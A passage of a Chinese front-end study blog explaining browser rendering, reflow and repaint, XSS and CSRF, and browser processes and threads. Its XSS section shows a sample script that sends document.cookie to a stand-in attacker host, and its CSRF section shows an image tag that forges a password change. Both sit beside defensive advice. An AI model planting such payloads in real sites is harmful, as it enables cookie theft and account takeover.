<li><p><strong>计算布局（Layout）：</strong> 渲染树中的每个元素都会根据其样式信息计算其在页面上的位置和大小。这个过程被称为布局或回流（reflow）。</p>
</li>
<li><p><strong>绘制（Paint）：</strong> 浏览器根据计算得到的布局信息开始绘制页面。这包括绘制元素的背景、边框、文本和其他内容。</p>
</li>
<li><p><strong>合成（Composite）：</strong> 浏览器将页面上的各个图层按正确的顺序合成到最终的页面画布上。这个过程通常由 GPU（图形处理单元）执行，以提高性能和平滑动画。</p>
</li>
<li><p><strong>显示（Display）：</strong> 最终的渲染结果被显示在用户的屏幕上。</p>
</li>
</ol>
<p>需要注意的是，浏览器通常会对上述步骤进行优化，例如使用异步加载和渲染，以提高页面加载和响应性能。此外，当页面中的数据发生变化或用户与页面进行交互时，浏览器会重新执行部分或全部的渲染流程，以确保页面保持最新的状态。</p>
<p>总之，浏览器渲染数据是一个复杂的多阶段过程，涉及 HTML、CSS、DOM、样式计算、布局、绘制、合成等多个组件和步骤，最终将页面内容呈现给用户。了解这个过程有助于优化页面性能和理解前端开发中的渲染问题。</p>
<h3 id="4、重排，重绘？什么操作会触发"><a href="#4、重排，重绘？什么操作会触发" class="headerlink" title="4、重排，重绘？什么操作会触发"></a>4、重排，重绘？什么操作会触发</h3><p>在浏览器渲染页面时，有两个重要的概念：重排（Reflow）和重绘（Repaint）。它们分别表示在不同情况下浏览器会重新计算元素的布局和重新绘制元素的样式，具体如下：</p>
<ol>
<li><p><strong>重排（Reflow）：</strong> 也称为回流，是指浏览器重新计算元素的大小和位置，并重新构建页面的布局。重排通常是由以下操作触发的：</p>
<ul>
<li>添加、删除、修改 DOM 元素。</li>
<li>改变窗口大小。</li>
<li>修改元素的位置、大小、内容或样式。</li>
<li>修改字体大小。</li>
<li>获取某些属性（如 offsetWidth、offsetHeight、clientWidth、clientHeight 等）。</li>
</ul>
<p>重排是非常昂贵的操作，因为它会导致整个页面重新布局，可能涉及多次布局计算，对性能影响较大。</p>
</li>
<li><p><strong>重绘（Repaint）：</strong> 是指浏览器重新绘制元素的可视部分，但不会改变元素的布局。重绘通常是由以下操作触发的：</p>
<ul>
<li>修改元素的背景色、颜色、边框等样式属性。</li>
<li>添加或移除 CSS 类。</li>
<li>修改元素的 opacity（透明度）。</li>
</ul>
<p>重绘相对于重排来说开销较小，因为它只涉及样式的变化，不需要重新计算布局。</p>
</li>
</ol>
<p>触发重排和重绘会导致浏览器重新计算并重新绘制页面，因此应尽量减少这些操作的频率，以提高页面性能。一种优化策略是将多次的 DOM 操作合并成一次，或者使用 CSS 动画来避免频繁的重排和重绘。</p>
<p>此外，现代浏览器还提供了一些工具来帮助开发者识别和优化重排和重绘的问题，例如浏览器的开发者工具可以显示这些操作的发生情况，帮助你定位性能瓶颈。</p>
<h3 id="5、浏览器安全：xss-x2F-csrf"><a href="#5、浏览器安全：xss-x2F-csrf" class="headerlink" title="5、浏览器安全：xss&#x2F;csrf"></a>5、浏览器安全：xss&#x2F;csrf</h3><p>浏览器安全是 Web 开发中非常重要的一部分，涉及到多个方面，包括 XSS（跨站脚本攻击）、CSRF（跨站请求伪造）以及跨域安全措施。以下是这些安全问题的简要介绍和防范措施：</p>
<h5 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h5><p>XSS（Cross-Site Scripting）跨站脚本攻击是一种常见的网络安全漏洞，攻击者通过注入恶意脚本代码到受信任网站的输入字段，然后使其他用户在浏览该网站时执行这些恶意脚本。XSS 攻击可以导致盗取用户信息、会话劫持、恶意操作用户账户等危险后果。</p>
<p>以下是关于 XSS 攻击的详细说明：</p>
<ol>
<li><p><strong>攻击原理</strong>：</p>
<p>XSS 攻击利用了网站未充分过滤或转义用户输入的漏洞。攻击者向受信任网站的输入字段（如搜索框、评论框、用户注册表单等）注入包含恶意 JavaScript 代码的输入。当其他用户访问包含这些恶意输入的页面时，他们的浏览器会执行注入的 JavaScript 代码，从而使攻击者能够执行恶意操作。</p>
</li>
<li><p><strong>攻击示例</strong>：</p>
<p>假设一个论坛网站允许用户在评论中输入文本，并且未对输入进行充分验证和过滤。攻击者可以在评论中注入如下恶意代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;https://attacker.com/steal-cookie?cookie=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>当其他用户浏览这个评论时，他们的浏览器会执行上述代码，将他们的 Cookie 数据发送到攻击者的服务器，攻击者可以利用这些信息来伪装成受害者，执行恶意操作。</p>
</li>
<li><p><strong>XSS 攻击类型</strong>：</p>
<ul>
<li><p><strong>存储型 XSS</strong>：攻击者将恶意脚本存储在服务器上，当其他用户访问包含恶意脚本的页面时，恶意代码会从服务器加载并执行。</p>
</li>
<li><p><strong>反射型 XSS</strong>：攻击者将恶意脚本注入到 URL 中，受害者点击包含恶意 URL 的链接时，恶意代码会从 URL 中执行。</p>
</li>
<li><p><strong>DOM-based XSS</strong>：攻击者注入恶意脚本，脚本会直接修改页面的 DOM 结构，而不涉及服务器端，攻击通常发生在客户端。</p>
</li>
</ul>
</li>
<li><p><strong>预防措施</strong>：</p>
<p>针对 XSS 攻击，可以采取以下预防措施：</p>
<ul>
<li><p><strong>输入验证</strong>：对用户输入数据进行验证，确保只接受预期的合法输入。</p>
</li>
<li><p><strong>转义输出</strong>：在将用户输入数据嵌入到 HTML、JavaScript 或其他上下文中之前，将其进行转义，以防止恶意代码的执行。常见的转义方法包括使用 HTML 实体编码、JavaScript 的 <code>encodeURIComponent</code> 等。</p>
</li>
<li><p><strong>HTTP 头部安全策略</strong>：使用 Content Security Policy（CSP）等 HTTP 头部安全策略，限制哪些内容可以加载和执行。</p>
</li>
<li><p><strong>使用框架和模板引擎</strong>：使用现代的 Web 框架和模板引擎，它们通常会自动处理输入验证和输出转义。</p>
</li>
<li><p><strong>不信任用户输入</strong>：将用户输入视为不可信，不要直接执行或渲染用户输入的内容。</p>
</li>
<li><p><strong>更新和维护</strong>：定期更新和维护应用程序，修复已知的漏洞和安全问题。</p>
</li>
</ul>
</li>
</ol>
<p>XSS 攻击是一个严重的安全问题，但通过合适的预防措施和最佳实践，可以有效地减轻其风险。开发者需要保持警惕，对用户输入数据进行充分的验证和转义，以确保应用程序的安全性。</p>
<h5 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h5><p>CSRF（Cross-Site Request Forgery）跨站请求伪造，是一种常见的网络安全攻击，攻击者通过伪装用户的身份，以用户的名义在受害者不知情的情况下执行操作。这种攻击可以导致未经授权的操作，例如更改密码、发送恶意请求等，从而损害用户的账户或数据。</p>
<p>以下是关于 CSRF 攻击的详细说明：</p>
<ol>
<li><p><strong>攻击原理</strong>：</p>
<p>CSRF 攻击利用了用户在访问网站时的身份验证信息（如 Cookie 或会话令牌）。攻击者诱使受害者在已经登录了某个受信任的网站 A 的情况下，访问恶意网站 B。网站 B 中的恶意代码会发起针对网站 A 的请求，利用了受害者在网站 A 中的身份验证凭证，从而执行某些操作，而受害者不自知。</p>
</li>
<li><p><strong>攻击示例</strong>：</p>
<p>假设网站 A 允许用户通过访问链接 <code>/change-password?new-password=attacker_password</code> 来更改密码。攻击者可以构造一个网站 B，在网站 B 中包含如下 HTML 代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://websiteA.com/change-password?new-password=attacker_password&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Harmless Image&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>当受害者访问网站 B 时，浏览器会加载这个图片，实际上是执行了对网站 A 的密码修改请求。</p>
</li>
<li><p><strong>预防措施</strong>：</p>
<p>针对 CSRF 攻击，可以采取以下预防措施：</p>
<ul>
<li><p><strong>同源策略</strong>：浏览器的同源策略限制了网页只能发起同源（同协议、同域名、同端口）的请求，这有助于防止跨站点请求伪造。</p>
</li>
<li><p><strong>CSRF Token</strong>：在每个请求中包含一个 CSRF Token，这个 Token 由服务器生成并与用户会话相关联。在执行敏感操作之前，服务器会验证请求中的 CSRF Token 是否与用户会话中的 Token 匹配。攻击者无法获取受害者的有效 CSRF Token，因此无法伪造有效请求。</p>
</li>
<li><p><strong>SameSite Cookie 属性</strong>：将 Cookie 的 <code>SameSite</code> 属性设置为 <code>Strict</code> 或 <code>Lax</code> 可以限制跨站点请求伪造。这样可以防止第三方网站通过 <code>&lt;img&gt;</code>、<code>&lt;script&gt;</code> 等标签伪造请求。</p>
</li>
<li><p><strong>Referer 检查</strong>：服务器可以检查请求的 Referer 头部，确保请求来自合法的来源。但这种方法不是百分之百可靠，因为有些浏览器可能会禁用 Referer。</p>
</li>
<li><p><strong>双重确认</strong>：对于执行敏感操作的请求，可以要求用户进行二次确认，以确保用户的意愿。</p>
</li>
<li><p><strong>限制敏感操作的 HTTP 方法</strong>：将敏感操作限制为 POST、PUT、DELETE 等需要请求主体的 HTTP 方法，而不是容易伪造的 GET。</p>
</li>
</ul>
</li>
</ol>
<p>CSRF 攻击是一个常见的网络安全问题，但通过采取适当的预防措施，可以有效减少其风险。在开发中，务必考虑和测试应用程序的安全性，以保护用户的数据和账户。</p>
<h5 id="csrf防范的token需要用什么信息生成"><a href="#csrf防范的token需要用什么信息生成" class="headerlink" title="csrf防范的token需要用什么信息生成"></a>csrf防范的token需要用什么信息生成</h5><p>CSRF（Cross-Site Request Forgery）攻击防范的Token通常称为CSRF Token或Anti-CSRF Token，它需要包含以下信息以有效地防止CSRF攻击：</p>
<ol>
<li><p><strong>随机数或加密信息：</strong> CSRF Token应该包含随机生成的数值或者加密信息，确保每个Token都是唯一的。这个信息可以是随机数、随机字符串、会话密钥等。这样可以防止攻击者猜测或预测Token的值。</p>
</li>
<li><p><strong>用户标识信息：</strong> Token通常需要包含关联到用户的标识信息，以确保Token只能由合法用户使用。这可以是用户的ID、用户名、邮箱等信息。</p>
</li>
<li><p><strong>时间戳或过期时间：</strong> 为了增加Token的安全性，可以将时间戳或过期时间包含在Token中。这可以确保Token在一定时间后失效，即使攻击者获取了Token，也无法长期滥用。</p>
</li>
<li><p><strong>其他安全性信息：</strong> 可以根据具体需求包含其他安全性信息，如来源网址、HTTP Referer 头信息等，以进一步增强Token的安全性。</p>
</li>
</ol>
<p>一旦生成了包含这些信息的CSRF Token，它可以被嵌入到Web表单或HTTP请求头中，然后在服务器端进行验证。服务器在接收到请求时，会检查请求中的Token是否与用户的标识信息和过期时间等匹配，如果匹配则认为请求是合法的，否则会拒绝请求，从而有效地防止CSRF攻击。</p>
<p>需要注意的是，CSRF Token的生成和验证是应用程序开发者的责任，开发者需要确保Token的安全性和合理性，以有效地保护应用程序免受CSRF攻击的威胁。常见的Web开发框架和库通常提供了一些工具和机制来简化CSRF Token的生成和验证过程。</p>
<h3 id="6、浏览器的线程与进程"><a href="#6、浏览器的线程与进程" class="headerlink" title="6、浏览器的线程与进程"></a>6、浏览器的线程与进程</h3><blockquote>
<p>写的很好的文章：<a target="_blank" rel="noopener" href="https://juejin.cn/post/7064499913115041806">https://juejin.cn/post/7064499913115041806</a></p>
</blockquote>
<p>浏览器的进程和线程是浏览器实现其功能的基础。它们之间的关系和任务分工对于理解浏览器的运行原理和性能优化至关重要。简单来说，进程是操作系统资源分配的最小单位，而线程是操作系统调度（CPU 利用率）的最小单位。</p>
<p>进程和线程之间的关系有以下 4 个特点。</p>
<ol>
<li><p><strong>进程中的任意一线程执行出错，都会导致整个进程的崩溃。</strong></p>
</li>
<li><p><strong>线程之间共享进程中的数据。</strong></p>
</li>
<li><p><strong>当一个进程关闭之后，操作系统会回收进程所占用的内存。</strong></p>
<p>当一个进程退出时，操作系统会回收该进程所申请的所有资源；即使其中任意线程因为操作不当导致内存泄漏，当进程退出时，这些内存也会被正确回收。</p>
</li>
<li><p><strong>进程之间的内容相互隔离。</strong></p>
<p>进程隔离是为保护操作系统中进程互不干扰的技术，每一个进程只能访问自己占有的数据，也就避免出现进程 A 写入数据到进程 B 的情况。正是因为进程之间的数据是严格隔离的，所以一个进程如果崩溃了，或者挂起了，是不会影响到其他进程的。如果进程之间需要进行数据的通信，这时候，就需要使用用于<strong>进程间通信（IPC）的机制</strong>了。</p>
</li>
</ol>
<p>解决 <strong>不稳定</strong> 问题：</p>
<ul>
<li>由于进程是相互隔离的，所以当一个页面或者插件崩溃时，影响到的仅仅是当前的页面进程或者插件进程，并不会影响到浏览器和其他页面，这就完美地解决了页面或者插件的崩溃会导致整个浏览器崩溃，也就是不稳定的问题。</li>
</ul>
<p>解决<strong>不流畅</strong>问题：</p>
<ul>
<li>JavaScript 也是运行在渲染进程中的，所以即使 JavaScript 阻塞了渲染进程，影响到的也只是当前的渲染页面，而并不会影响浏览器和其他页面，因为其他页面的脚本是运行在它们自己的渲染进程中的。</li>
</ul>
<p>解决<strong>不安全</strong>问题：</p>
<ul>
<li>采用多进程架构的额外好处是可以使用安全沙箱，你可以把沙箱看成是操作系统给进程上了一把锁，沙箱里面的程序可以运行，但是不能在你的硬盘上写入任何数据，也不能在敏感位置读取任何数据，例如你的文档和桌面。Chrome 把插件进程和渲染进程锁在沙箱里面，这样即使在渲染进程或者插件进程里面执行了恶意程序，恶意程序也无法突破沙箱去获取系统权限。</li>
</ul>
<p><strong>进程</strong>：</p>
<ul>
<li><code>浏览器进程</code>：主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。</li>
<li><code>渲染进程</code>：核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。出于安全考虑，渲染进程都是运行在沙箱模式下。</li>
<li>GPU 进程。其实，Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。</li>
<li><code>网络进程</code>：主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。</li>
<li><code>插件进程</code>：主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。</li>
</ul>
<h5 id="页面加载的流程："><a href="#页面加载的流程：" class="headerlink" title="页面加载的流程："></a>页面加载的流程：</h5><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8c6004fc2f664f2186a727624ed39ae8~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<ol>
<li><p><strong><a href="https://link.juejin.cn/?target=https://github.com/skyline75489/what-happens-when-zh_CN%23g">用户输入url并回车</a>。浏览器进程</strong>会<a target="_blank" rel="noopener" href="https://juejin.cn/post/7025956944028532743#heading-2">根据用户输入的信息判断</a>是搜索还是网址，如果是搜索内容，就将搜索内容+默认搜索引擎合成新的URL；如果用户输入的内容符合URL规则，<strong>浏览器进程</strong>就会根据URL协议，在这段内容上加上协议合成合法的URL。</p>
</li>
<li><p>浏览器导航栏显示loading状态，但是页面还是呈现之前的页面不变，因为新页面的响应数据还没有获得。</p>
</li>
<li><p><strong>浏览器进程</strong>构建请求行信息，通过进程间通信（IPC）把url请求发送给<strong>网络进程</strong>。</p>
</li>
<li><p><strong>网络进程</strong>接收到url请求后<a target="_blank" rel="noopener" href="https://juejin.cn/post/7025956944028532743#heading-5">检查本地缓存是否缓存了该请求资源</a>，如果有则将该资源返回给<strong>浏览器进程</strong>。</p>
</li>
<li><p>如果没有，<strong>网络进程</strong>向web服务器发起http请求（网络请求），请求流程如下：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7025956944028532743#heading-12">进行DNS解析，获取服务器ip地址</a>（先查找DNS缓存，再发起DNS网络请求）</li>
<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7025956944028532743#heading-19">利用ip地址和服务器建立tcp连接</a>（TCP三次握手建立的连接并不是真实的物理连接，而是虚连接，连接的本质就是在客户端与服务端开辟本次连接所需要的资源（内存、进程等））</li>
<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/7025956944028532743#heading-59">完成构建请求信息并发送请求</a>（调用Socket利用TCP通过三次握手连接建立后，之前准备好的HTTP请求报文被送入发送队列，接下来就交给了TCP完成后续过程）</li>
<li>服务器响应后，<strong>网络进程</strong>接收响应头和响应信息，并解析响应内容</li>
</ol>
</li>
<li><p><strong>网络进程</strong>解析响应流程：</p>
<ol>
<li>检查状态码，如果是301&#x2F;302，则需要重定向，从Location自动中读取地址，重新进行第三步，如果是200，则继续处理请求。</li>
<li>检查响应类型Content-Type，如果是字节流类型，则将该请求提交给下载管理器，该导航流程结束，不再进行后续的渲染，如果是html等资源则将其转发给<strong>浏览器进程</strong>。</li>
</ol>
</li>
<li><p><strong>浏览器进程</strong>接收到网络进程的响应头数据之后，检查当前url是否和<strong>之前打开的渲染进程</strong>根域名是否相同，如果相同，则复用原来的进程，如果不同，则<strong>开启新的渲染进程</strong>（这个文章后面还会展开说）。</p>
</li>
<li><p><strong>渲染进程</strong>准备好后，<strong>浏览器进程</strong>发送<code>CommitNavigation</code>消息到<strong>渲染进程</strong>，发送<code>CommitNavigation</code>时会携带响应头、等基本信息。<strong>渲染进程</strong>接收到消息和<strong>网络进程</strong>建立传输数据的“管道”。</p>
</li>
<li><p><strong>渲染进程</strong>接收完数据后，向<strong>浏览器进程</strong>发送“确认提交”。</p>
</li>
<li><p><strong>浏览器进程</strong>接收到确认消息后更新浏览器界面状态：安全、地址栏url、前进后退的历史状态、更新web页面。</p>
</li>
</ol>
<p><strong>浏览器渲染进程的线程</strong>：</p>
<p>（1）GUI渲染线程</p>
<p>负责渲染浏览器页面，解析HTML、CSS，构建DOM树、构建CSSOM树、构建渲染树和绘制页面；当界面需要重绘或由于某种操作引发回流时，该线程就会执行。 注意：GUI渲染线程和JS引擎线程是互斥的，当JS引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。</p>
<p>（2）JS引擎线程</p>
<p>JS引擎线程也称为JS内核，负责处理Javascript脚本程序，解析Javascript脚本，运行代码；JS引擎线程一直等待着任务队列中任务的到来，然后加以处理，一个Tab页中无论什么时候都只有一个JS引擎线程在运行JS程序； 注意：GUI渲染线程与JS引擎线程的互斥关系，所以如果JS执行的时间过长，会造成页面的渲染不连贯，导致页面渲染加载阻塞。</p>
<p>（3）事件触发线程</p>
<p>事件触发线程属于浏览器而不是JS引擎，用来控制事件循环；当JS引擎执行代码块如setTimeOut时（也可是来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件触发线程中；当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理； 注意：由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行）；</p>
<p>（4）定时器触发进程</p>
<p>定时器触发进程即setInterval与setTimeout所在线程；浏览器定时计数器并不是由JS引擎计数的，因为JS引擎是单线程的，如果处于阻塞线程状态就会影响记计时的准确性；因此使用单独线程来计时并触发定时器，计时完毕后，添加到事件队列中，等待JS引擎空闲后执行，所以定时器中的任务在设定的时间点不一定能够准时执行，定时器只是在指定时间点将任务添加到事件队列中； 注意：W3C在HTML标准中规定，定时器的定时时间不能小于4ms，如果是小于4ms，则默认为4ms。</p>
<p>（5）异步http请求线程</p>
<p>●XMLHttpRequest连接后通过浏览器新开一个线程请求； ●检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将回调函数放入事件队列中，等待JS引擎空闲后执行；</p>
<h5 id="完整的渲染流程"><a href="#完整的渲染流程" class="headerlink" title="完整的渲染流程"></a>完整的渲染流程</h5><p><strong>一旦文档被提交，渲染进程便开始页面解析和子资源加载了。</strong> 为了能更好地理解下文，你可以先结合下图快速抓住 HTML、CSS 和 JavaScript 的含义：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9e8dbd186b604834a56069ad23f66225~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>由于渲染机制过于复杂，所以渲染模块在执行过程中会被划分为很多子阶段，输入的 HTML 经过这些子阶段，最后输出像素。我们把这样的一个处理流程叫做渲染流水线，其大致流程如下图所示：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/63a9b7a52df041da922e45b0a18d62ee~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>按照渲染的时间顺序，流水线可分为如下几个子阶段：<strong>构建 DOM 树、样式计算、布局阶段、分层、绘制、分块、光栅化和合成。</strong></p>
<p>过程很多，但是我们都可以从下面三个方面去理解每一个阶段：</p>
<ul>
<li>开始每个子阶段都有其<strong>输入的内容</strong></li>
<li>然后每个子阶段有其<strong>处理过程</strong></li>
<li>最终每个子阶段会生成<strong>输出内容</strong></li>
</ul>
<p>理解了这三部分内容，能让你更加清晰地理解每个子阶段。</p>
<p><strong>构建DOM树</strong></p>
<p>因为浏览器无法直接理解和使用 HTML，所以需要将 HTML 转换为浏览器能够理解的结构——DOM 树。何为DOM树，可以参考下图加以理解：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/85bca2eba7f74892856a29a1b7e42d0d~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>从图中可以看出，构建 DOM 树的输入内容是一个非常简单的 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM。同样我们可以在控制台中的<code>Console</code>标签中输入<code>document</code>后回车，这样我们也能看到一个完整的DOM树。</p>
<p>DOM 和 HTML 内容几乎是一样的，但是和 HTML 不同的是，DOM 是保存在内存中树状结构，可以通过 JavaScript 来查询或修改其内容。</p>
<p><strong>样式计算</strong></p>
<p>样式计算的目的是为了计算出 DOM 节点中每个元素的具体样式，这个阶段大体可分为三步来完成。</p>
<ol>
<li>把 CSS 转换为浏览器能够理解的结构</li>
</ol>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cabb65ba8d0b46d18055fb0f09a1c5e0~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>从图中可以看出，CSS 样式来源主要有三种：</p>
<ul>
<li>通过 link 引用的外部 CSS 文件</li>
<li><style>标记内的 CSS</li>
<li>元素的 style 属性内嵌的 CSS</li>
</ul>
<p>和 HTML 文件一样，浏览器也是无法直接理解这些纯文本的 CSS 样式，所以<strong>当渲染引擎接收到 CSS 文本时，会执行一个转换操作，将 CSS 文本转换为浏览器可以理解的结构——styleSheets</strong>。</p>
<p>为了加深理解，你可以在 Chrome 控制台中查看其结构，只需要在控制台中输入 <code>document.styleSheets</code>，然后就看到如下图所示的结构：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bf663f523fe64e1a9a0deec4ac012f6b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>从图中可以看出，这个样式表包含了很多种样式，已经把那三种来源的样式都包含进去了，并且该结构同时具备了查询和修改功能，这会为后面的样式操作提供基础。</p>
<ol start="2">
<li>转换样式表中的属性值，使其标准化</li>
</ol>
<p>现在我们已经把现有的 CSS 文本转化为浏览器可以理解的结构了，那么<strong>接下来就要对其进行属性值的标准化操作</strong>。</p>
<p>要理解什么是属性值标准化，你可以看下面这样一段 CSS 文本：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">css<br>复制代码<span class="hljs-selector-tag">body</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2em</span> &#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;<br><span class="hljs-selector-tag">span</span> &#123;<span class="hljs-attribute">display</span>: none&#125;<br><span class="hljs-selector-tag">div</span> &#123;<span class="hljs-attribute">font-weight</span>: bold&#125;<br><span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:green;&#125;<br><span class="hljs-selector-tag">div</span> &#123;<span class="hljs-attribute">color</span>:red; &#125;<br></code></pre></td></tr></table></figure>

<p>可以看到上面的 CSS 文本中有很多属性值，如 2em、blue、bold，这些类型数值不容易被渲染引擎理解，所以<strong>需要将所有值转换为渲染引擎容易理解的、标准化的计算值</strong>，这个过程就是属性值标准化。下图就是标准化的结果：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/241469942d794a6e9ba786c4e068fa5a~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<ol start="3">
<li>计算出 DOM 树中每个节点的具体样式</li>
</ol>
<p>现在样式的属性已被标准化了，接下来就需要计算 DOM 树中每个节点的样式属性了，<strong>这就涉及到 CSS 的继承规则和层叠规则了。</strong></p>
<p>首先是 CSS 继承。<strong>CSS 继承就是每个 DOM 节点都包含有父节点的样式。</strong> 这么说可能有点抽象，我们可以结合具体例子，看下面这样一张样式表是如何应用到 DOM 节点上的。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">css<br>复制代码<span class="hljs-selector-tag">body</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span> &#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;<br><span class="hljs-selector-tag">span</span>  &#123;<span class="hljs-attribute">display</span>: none&#125;<br><span class="hljs-selector-tag">div</span> &#123;<span class="hljs-attribute">font-weight</span>: bold;<span class="hljs-attribute">color</span>:red&#125;<br><span class="hljs-selector-tag">div</span>  <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:green;&#125;<br></code></pre></td></tr></table></figure>

<p>这张样式表最终应用到 DOM 节点的效果如下图所示：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cb9b69a5f40d4f87bcad5154128e0c7e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>从图中可以看出，所有子节点都继承了父节点样式。比如 body 节点的 <code>font-size</code> 属性是 20，那 body 节点下面的所有节点的 <code>font-size</code> 都等于 20。</p>
<p><strong>这里需要特别提下 UserAgent 样式，它是浏览器提供的一组默认样式，如果你不提供任何样式，默认使用的就是 UserAgent 样式。</strong></p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dae336e8414e444c92e1864453c17108~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>样式计算过程中的第二个规则是样式层叠。<strong>层叠是 CSS 的一个基本特征，它是一个定义了如何合并来自多个源的属性值的算法。它在 CSS 处于核心地位，CSS 的全称“层叠样式表”正是强调了这一点。</strong></p>
<p>总之，样式计算阶段的目的是为了计算出 DOM 节点中每个元素的具体样式，在计算过程中需要遵守 CSS 的继承和层叠两个规则。这个阶段最终输出的内容是每个 DOM 节点的样式，并被保存在 <code>ComputedStyle</code> 的结构内。</p>
<p><strong>布局阶段</strong></p>
<p>现在，我们有 DOM 树和 DOM 树中元素的样式，但这还不足以显示页面，因为我们还不知道 DOM 元素的几何位置信息。<strong>那么接下来就需要计算出 DOM 树中可见元素的几何位置，我们把这个计算过程叫做布局。</strong></p>
<p><code>Chrome</code> 在布局阶段需要完成两个任务：<strong>创建布局树和布局计算</strong>。</p>
<ol>
<li>创建布局树</li>
</ol>
<p>DOM 树还含有很多不可见的元素，比如 <code>head</code> 标签，还有使用了 <code>display:none</code> 属性的元素。所以在显示之前，还要额外地构建一棵只包含可见元素布局树。</p>
<p>我们结合下图来看看布局树的构造过程：</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/05f42c09057d48a397beb75d5ed83511~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" srcset="/blog/img/loading.gif" lazyload alt="img"></p>
<p>从上图可以看出，DOM 树中所有不可见的节点都没有包含到布局树中。</p>
<p>为了构建布局树，浏览器大体上完成了下面这些工作：</p>
<ul>
